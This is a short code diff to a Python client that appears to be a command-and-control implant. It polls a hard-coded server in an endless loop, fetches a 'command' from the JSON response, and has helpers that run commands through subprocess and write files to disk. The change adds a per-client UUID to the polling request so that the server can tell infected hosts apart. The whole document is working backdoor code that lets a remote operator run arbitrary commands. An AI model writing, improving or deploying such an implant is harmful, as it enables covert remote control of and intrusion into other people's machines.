@@ -2,6 +2,7 @@ import requests
 import time
 import subprocess
 import os
+import uuid
 
 def execute_command(command):
     try:
@@ -15,6 +16,7 @@ def save_file(file_name, file_content):
         file.write(file_content)
 
 server_url = "http://10.70.0.68:80"  # Replace <server_ip> with the actual IP of the server
+client_uuid = str(uuid.uuid4())
 backoff_time = 5
 
 headers = {
@@ -28,7 +30,7 @@ post_headers = {
 while True:
     try:
         # Poll the server for a command
-        response = requests.get(f"{server_url}/", headers=headers)
+        response = requests.get(f"{server_url}/?uuid={client_uuid}", headers=headers)
         command_data = response.json()
         command = command_data.get("command", "none")
 
